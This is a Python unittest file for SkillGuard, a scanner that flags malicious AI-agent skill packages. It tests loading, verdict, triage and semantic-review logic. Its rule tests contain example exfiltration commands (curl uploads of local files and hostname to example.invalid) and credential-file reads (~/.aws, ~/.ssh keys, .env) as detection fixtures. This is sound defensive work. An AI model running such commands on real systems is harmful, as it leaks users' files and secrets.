"""Regression tests for SkillGuard (stdlib unittest; no network, no paid calls).

Run:  python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import math
import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from skillguard import layer1, openrouter, report, scanner, semantic, triage
from skillguard.model import Finding, LayerStatus
from skillguard.skill import MAX_FILE_BYTES, SkillFile, SkillLoadError, load_skill

MANIFEST = "---\nname: sample\ndescription: A sample skill for tests.\n---\n# Sample\n\nDoes nothing.\n"


def make_skill(files: dict[str, str | bytes]) -> Path:
    root = Path(tempfile.mkdtemp())
    for rel, content in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content if isinstance(content, bytes) else content.encode())
    return root


def md(text: str, path: str = "SKILL.md") -> SkillFile:
    return SkillFile(path, text, False)


def layers(*names_ok, skipped=()) -> list[LayerStatus]:
    out = [LayerStatus(n, ok) for n, ok in names_ok]
    out += [LayerStatus(n, True, skipped=True) for n in skipped]
    return out


FULL = [("checks", True), ("cisco", True), ("triage", True), ("semantic", True)]


# --- Loader (review bugs 1-3) -------------------------------------------------------------------

class LoaderTests(unittest.TestCase):
    def test_symlink_outside_root_is_not_read(self):
        outside = Path(tempfile.mkdtemp()) / "private.txt"
        outside.write_text("private data")
        root = make_skill({"SKILL.md": MANIFEST})
        os.symlink(outside, root / "notes.md")
        skill = load_skill(root)
        self.assertNotIn("notes.md", [f.path for f in skill.files])
        self.assertTrue(any("notes.md" in g and "symlink" in g for g in skill.coverage_gaps))

    def test_symlinked_directory_is_not_followed(self):
        outside = Path(tempfile.mkdtemp())
        (outside / "a.md").write_text("x")
        root = make_skill({"SKILL.md": MANIFEST})
        os.symlink(outside, root / "linked")
        skill = load_skill(root)
        self.assertFalse(any(f.path.startswith("linked") for f in skill.files))
        self.assertTrue(skill.coverage_gaps)

    def test_missing_directory_raises(self):
        with self.assertRaises(SkillLoadError):
            load_skill(Path("/nonexistent/skillguard-test"))

    def test_missing_manifest_is_a_coverage_gap(self):
        skill = load_skill(make_skill({"README.md": "hi"}))
        self.assertTrue(any("SKILL.md" in g for g in skill.coverage_gaps))

    def test_lowercase_manifest_is_accepted(self):
        skill = load_skill(make_skill({"skill.md": MANIFEST}))
        self.assertIsNotNone(skill.manifest)
        self.assertFalse(skill.coverage_gaps)

    def test_oversized_text_file_is_a_coverage_gap(self):
        root = make_skill({"SKILL.md": MANIFEST, "big.md": "a" * (MAX_FILE_BYTES + 1)})
        self.assertTrue(any("big.md" in g for g in load_skill(root).coverage_gaps))

    def test_unknown_binary_is_a_gap_but_media_is_not(self):
        root = make_skill({"SKILL.md": MANIFEST, "tool.bin": b"\0\1\2" * 10, "font.ttf": b"\0\1\2" * 10})
        skill = load_skill(root)
        self.assertTrue(any("tool.bin" in g for g in skill.coverage_gaps))
        self.assertIn("font.ttf", skill.binary_files)

    def test_bundled_node_modules_is_a_gap(self):
        root = make_skill({"SKILL.md": MANIFEST, "node_modules/x/index.js": "module.exports = 1"})
        self.assertTrue(any("node_modules" in g for g in load_skill(root).coverage_gaps))


# --- Verdict and coverage (bugs 2, 3, 4) -----------------------------------------------------------

class VerdictTests(unittest.TestCase):
    def test_complete_clean_scan_is_safe(self):
        self.assertEqual(scanner.verdict([], {"intent": "benign"}, layers(*FULL))[0], "SAFE")

    def test_empty_layer_list_is_not_safe(self):
        self.assertEqual(scanner.verdict([], {}, [])[0], "REVIEW")

    def test_skipped_llm_or_cisco_is_not_safe(self):
        for skipped in ("semantic", "cisco"):
            ran = [(n, ok) for n, ok in FULL if n != skipped]
            label, reason = scanner.verdict([], {}, layers(*ran, skipped=[skipped]))
            self.assertEqual(label, "REVIEW", skipped)
            self.assertIn(skipped, reason)

    def test_skipped_triage_alone_can_be_safe(self):
        ran = [(n, ok) for n, ok in FULL if n != "triage"]
        self.assertEqual(scanner.verdict([], {"intent": "benign"}, layers(*ran, skipped=["triage"]))[0], "SAFE")

    def test_failed_layer_is_review(self):
        failed = [(n, n != "semantic") for n, _ in FULL]
        self.assertEqual(scanner.verdict([], {}, layers(*failed))[0], "REVIEW")

    def test_coverage_gap_is_review(self):
        gap = Finding("check", "COVERAGE_GAP", "AST08", "MEDIUM", "gap", precise=True)
        self.assertEqual(scanner.verdict([gap], {"intent": "benign"}, layers(*FULL))[0], "REVIEW")

    def test_malicious_intent_blocks(self):
        self.assertEqual(scanner.verdict([], {"intent": "malicious"}, layers(*FULL))[0], "BLOCK")

    def test_single_llm_finding_does_not_block(self):
        f = Finding("semantic", "LLM_REVIEW", "AST01", "HIGH", "x")
        self.assertEqual(scanner.verdict([f], {"intent": "risky_but_legitimate"}, layers(*FULL))[0], "REVIEW")

    def test_precise_high_ast01_blocks(self):
        f = Finding("check", "X", "AST01", "CRITICAL", "x", precise=True)
        self.assertEqual(scanner.verdict([f], {"intent": "benign"}, layers(*FULL))[0], "BLOCK")

    def test_offline_scan_of_valid_skill_is_not_safe(self):
        result = scanner.scan(make_skill({"SKILL.md": MANIFEST}), use_llm=False, use_triage=False, use_cisco=False)
        self.assertEqual(result["verdict"], "REVIEW")
        self.assertEqual({l["name"] for l in result["layers"] if l["skipped"]}, {"cisco", "triage", "semantic"})
        self.assertEqual((result["tokens_in"], result["tokens_out"]), (0, 0))

    def test_scan_totals_tokens_across_layers(self):
        review = {"intent": "benign", "declared_purpose": "p", "actual_behavior": "b", "summary": "s", "findings": []}
        status = LayerStatus("semantic", True, "d", tokens_in=1234, tokens_out=56)
        with mock.patch.object(semantic, "run", return_value=(review, [], status)):
            result = scanner.scan(make_skill({"SKILL.md": MANIFEST}), use_triage=False, use_cisco=False)
        self.assertEqual((result["tokens_in"], result["tokens_out"]), (1234, 56))
        self.assertIn("1,234 in / 56 out tokens", report.to_markdown(result))


# --- Cisco adapter (bug 5) --------------------------------------------------------------------------

class CiscoParseTests(unittest.TestCase):
    good = {"findings": [{"rule_id": "R1", "severity": "HIGH", "category": "data_exfiltration"}]}

    def test_valid_report(self):
        self.assertEqual([f.rule for f in layer1.parse_cisco_report(0, self.good)], ["R1"])

    def test_nonzero_exit_rejected(self):
        with self.assertRaises(ValueError):
            layer1.parse_cisco_report(2, {"findings": []})

    def test_missing_findings_rejected(self):
        with self.assertRaises(ValueError):
            layer1.parse_cisco_report(0, {"not_findings": []})

    def test_bad_severity_rejected(self):
        with self.assertRaises(ValueError):
            layer1.parse_cisco_report(0, {"findings": [{"rule_id": "R", "severity": "WHATEVER"}]})


# --- Triage validation and policy (bugs 6, 8) ---------------------------------------------------------

class TriageTests(unittest.TestCase):
    def test_rejects_missing_or_bad_probabilities(self):
        bad = [
            {"choice": "true_positive", "probabilities": {}},
            {"choice": "true_positive", "probabilities": {"true_positive": math.nan, "benign_risk": 0, "false_positive": 0}},
            {"choice": "unknown", "probabilities": {"true_positive": 1, "benign_risk": 0, "false_positive": 0}},
            {"choice": "true_positive", "probabilities": {"true_positive": 0.1, "benign_risk": 0.1, "false_positive": 0.1}},
        ]
        for answer in bad:
            with self.assertRaises(ValueError, msg=answer):
                triage.validate_answer(answer)

    def test_error_result_keeps_severity(self):
        f = Finding("cisco", "R", "AST01", "HIGH", "x")
        triage.apply(f, {"verdict": "error", "error": "boom"})
        self.assertEqual((f.severity, f.status), ("HIGH", "active"))

    def test_decide_policy(self):
        def probs(tp, br, fp):
            return {"verdict": "benign_risk", "probabilities": {"true_positive": tp, "benign_risk": br, "false_positive": fp}}
        self.assertEqual(triage.decide("HIGH", probs(0.5, 0.3, 0.2)), "keep")
        self.assertEqual(triage.decide("HIGH", probs(0.0, 0.3, 0.7)), "remove")
        self.assertEqual(triage.decide("HIGH", probs(0.0, 0.6, 0.4)), "downgrade")
        self.assertEqual(triage.decide("INFO", probs(0.0, 0.6, 0.4)), "keep")

    def _llm_setup(self, n=3):
        skill = load_skill(make_skill({"SKILL.md": MANIFEST}))
        findings = [Finding("cisco", f"R{i}", "AST01", "HIGH", "x", file="SKILL.md", line=1) for i in range(n)]
        return skill, findings

    @staticmethod
    def _judgment(fid, verdict, tp, br, fp):
        return {"id": fid, "verdict": verdict, "reason": "r",
                "probabilities": {"true_positive": tp, "benign_risk": br, "false_positive": fp}}

    def test_chat_model_triage_applies_same_policy_and_counts_tokens(self):
        skill, findings = self._llm_setup()
        answer = {"judgments": [self._judgment("F1", "true_positive", 0.9, 0.1, 0.0),
                                self._judgment("F2", "false_positive", 0.0, 0.2, 0.8),
                                self._judgment("F3", "benign_risk", 0.05, 0.75, 0.2)]}
        usage = {"prompt_tokens": 1000, "completion_tokens": 200, "cost": 0.0002}
        with mock.patch.object(triage, "chat_json", return_value=(answer, usage)):
            status = triage.run(skill, findings, model="openai/gpt-6-luna")
        self.assertTrue(status.ok)
        self.assertEqual([f.status for f in findings], ["active", "removed", "downgraded"])
        self.assertEqual((status.tokens_in, status.tokens_out), (1000, 200))

    def test_chat_model_missing_judgment_keeps_finding_and_fails_layer(self):
        skill, findings = self._llm_setup(2)
        answer = {"judgments": [self._judgment("F1", "false_positive", 0.0, 0.1, 0.9)]}  # F2 missing
        with mock.patch.object(triage, "chat_json", return_value=(answer, {"prompt_tokens": 10, "completion_tokens": 5})):
            status = triage.run(skill, findings, model="openai/gpt-6-luna")
        self.assertFalse(status.ok)
        self.assertEqual(findings[1].status, "active")
        self.assertEqual(findings[1].severity, "HIGH")
        self.assertEqual(status.tokens_in, 20)  # both attempts are counted

    def test_chat_model_error_counts_tokens(self):
        skill, findings = self._llm_setup(1)
        err = openrouter.LLMError("incomplete answer", {"prompt_tokens": 7, "completion_tokens": 3})
        with mock.patch.object(triage, "chat_json", side_effect=err):
            status = triage.run(skill, findings, model="openai/gpt-6-luna")
        self.assertFalse(status.ok)
        self.assertEqual((status.tokens_in, status.tokens_out), (14, 6))

    def test_batches_respect_size(self):
        batches = triage._llm_batches([(f"F{i}", "x" * 10) for i in range(40)])
        self.assertTrue(all(len(b) <= triage.LLM_BATCH_FINDINGS for b in batches))
        self.assertEqual(sum(len(b) for b in batches), 40)

    def test_limit_overflow_fails_layer(self):
        findings = [Finding("cisco", f"R{i}", "AST01", "HIGH", "x", file="SKILL.md", line=1) for i in range(5)]
        skill = load_skill(make_skill({"SKILL.md": MANIFEST}))
        ok = {"verdict": "true_positive", "probabilities": {"true_positive": 1.0, "benign_risk": 0.0, "false_positive": 0.0}, "cost": 0.0}
        with mock.patch.object(triage, "MAX_TRIAGED", 3), mock.patch.object(triage, "judge_state", return_value=ok):
            status = triage.run(skill, findings)
        self.assertFalse(status.ok)
        self.assertIn("2 finding(s) over the limit", status.detail)


# --- Rules (bugs 7, 9, 14 and regex suggestions) -------------------------------------------------------

class RuleTests(unittest.TestCase):
    def rules(self, text: str) -> set[str]:
        return {f.rule for f in layer1.check_untrusted_installer(md(text))}

    def test_archive_password_needs_download_context(self):
        self.assertFalse(self.rules("For `archive.zip`, enter its password when prompted."))
        self.assertIn("PASSWORD_PROTECTED_DOWNLOAD",
                      self.rules("Download https://example.invalid/tool.zip and extract with password `x`."))

    def test_upload_forms_detected(self):
        for line in [
            "curl -T notes.txt https://example.invalid/",
            "curl --upload-file ~/notes.txt https://example.invalid/",
            "curl --json @data.json https://example.invalid/",
            'curl -s --data "{\\"h\\": \\"$(hostname)\\"}" https://example.invalid/',
            "curl -d @notes.txt https://example.invalid/",
        ]:
            self.assertTrue(layer1.sends_local_data(line), line)

    def test_static_api_payload_not_flagged(self):
        for line in [
            "curl https://api.example.invalid/v1 -H \"x-api-key: $API_KEY\" -d '{\"model\": \"m\"}'",
            "curl -s https://example.invalid/status",
        ]:
            self.assertFalse(layer1.sends_local_data(line), line)

    def test_send_rule_is_linear_on_hostile_lines(self):
        line = "curl nothing " * 5000
        started = time.monotonic()
        layer1.sends_local_data(line)
        self.assertLess(time.monotonic() - started, 1.0)

    def test_credential_paths(self):
        for text in ["cat .env.local", "ls ~/.aws", "read credentials.json", "open ~/.ssh/id_ed25519"]:
            self.assertTrue(layer1.check_credential_access(md(text, "x.md")), text)
        self.assertFalse(layer1.check_credential_access(md("set environment variables", "x.md")))

    def test_no_cap_on_credential_findings(self):
        text = "\n".join(f"see .env line {i}" for i in range(8))
        self.assertEqual(len(layer1.check_credential_access(md(text, "x.md"))), 8)

    def test_low_entropy_blob_not_flagged(self):
        self.assertFalse(layer1.check_encoded_payloads(md("x = '" + "a" * 300 + "'", "x.py")))


# --- LLM layer (bugs 10-13) ---------------------------------------------------------------------------

class SemanticTests(unittest.TestCase):
    def test_huge_single_line_manifest_fits_budget_and_is_covered(self):
        manifest = "---\nname: big\ndescription: d\n---\n" + "word " * 80_000  # ~400K chars, one line
        skill = load_skill(make_skill({"SKILL.md": manifest, "run.py": "print(1)\n"}))
        system_chars = 5_000
        prompts, _ = semantic.build_prompts(skill, [], "n0nce", system_chars=system_chars)
        self.assertTrue(all(len(p) + system_chars <= semantic.MAX_PROMPT_CHARS for p in prompts))
        covered = sum(p.count("word ") for p in prompts)
        self.assertGreaterEqual(covered, 80_000)  # nothing dropped (the context copy may repeat some)
        self.assertTrue(any("run.py" in p for p in prompts))

    def test_evidence_must_match_cited_line_in_full(self):
        file = SkillFile("SKILL.md", "\n".join(f"line {i} text" for i in range(1, 30)), False)
        self.assertTrue(semantic.evidence_verified(file, 5, "line 5 text"))
        self.assertFalse(semantic.evidence_verified(file, 5, "line 25 text"))           # far from cited line
        self.assertFalse(semantic.evidence_verified(file, 5, "line 5 text and more"))   # fabricated suffix
        self.assertFalse(semantic.evidence_verified(file, 500, "line 5 text"))          # nonexistent line

    def test_incomplete_review_rejected(self):
        self.assertTrue(semantic.validate_review({"intent": "benign", "findings": []}))
        full = {"intent": "benign", "findings": [], "declared_purpose": "a", "actual_behavior": "b", "summary": "c"}
        self.assertEqual(semantic.validate_review(full), "")

    def test_truncated_answer_rejected(self):
        body = {"choices": [{"finish_reason": "length", "message": {"content": '{"intent": "benign", "findings": []}'}}]}
        with mock.patch.object(openrouter, "post", return_value=body):
            with self.assertRaises(openrouter.LLMError):
                openrouter.chat_json("m", "s", "u")

    def test_merge_uses_worst_behavior(self):
        a = {"intent": "benign", "declared_purpose": "p", "actual_behavior": "only formatting", "summary": "ok", "findings": []}
        b = {"intent": "malicious", "declared_purpose": "p", "actual_behavior": "uploads files", "summary": "bad", "findings": [{}]}
        merged = semantic.merge_reviews([a, b])
        self.assertEqual((merged["intent"], merged["actual_behavior"], merged["summary"]), ("malicious", "uploads files", "bad"))
        self.assertEqual(len(merged["findings"]), 1)


class ReportTests(unittest.TestCase):
    def test_unknown_verdict_renders(self):
        result = {"skill": {"name": "s", "path": "/x", "files": 0}, "verdict": "WEIRD", "reason": "r",
                  "scanned_at": "t", "seconds": 0, "cost": 0, "layers": [], "findings": [], "review": {}}
        self.assertIn("UNKNOWN VERDICT", report.to_markdown(result))


if __name__ == "__main__":
    unittest.main()
